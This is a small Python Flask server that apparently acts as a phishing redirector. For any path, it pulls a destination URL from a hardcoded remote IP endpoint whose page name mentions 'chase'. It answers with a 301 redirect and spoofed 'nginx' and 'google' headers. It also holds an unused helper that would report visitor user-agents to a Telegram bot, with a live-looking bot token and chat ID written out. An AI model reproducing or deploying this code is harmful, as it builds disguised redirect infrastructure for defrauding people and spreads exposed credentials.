import requests
from flask import Flask,redirect,make_response,request



app = Flask(__name__)

def telegreamBOT(ua=None):

    msg = f'New Visit \nUser-Agent: {ua}'
    telegramAPI = f'https://api.telegram.org/bot5334712663:AAEyRf8km4ykqmhN76SCGAsVQmnRMqPyX9I/sendMessage?chat_id=-668120595&parse_mode=Markdown&text={msg}'

    request = requests.get(telegramAPI)

@app.route('/<name>')
def hello(name):


    sheet = requests.get('http://95.111.230.118/kisho/page/active_r.php?page=saidchase')
    link = sheet.text.strip().split('"')[1].split('\/\/')
    url = f'{link[0]}//{link[1]}'
    r = make_response(redirect(f"{url}", code=301))
    r.headers.set('alt-svc', "clear")
    r.headers.set('cache-control', "private, max-age=90")
    r.headers.set('content-security-policy', "referrer always;")
    r.headers.set('referrer-policy', "unsafe-url")
    r.headers.set('server', "nginx")
    r.headers.set('via', "1.1 google")
    
    return r,301




if __name__ == '__main__':
    # Bind to PORT if defined, otherwise default to 5000.
    app.run(host='0.0.0.0', port=int('5000'))
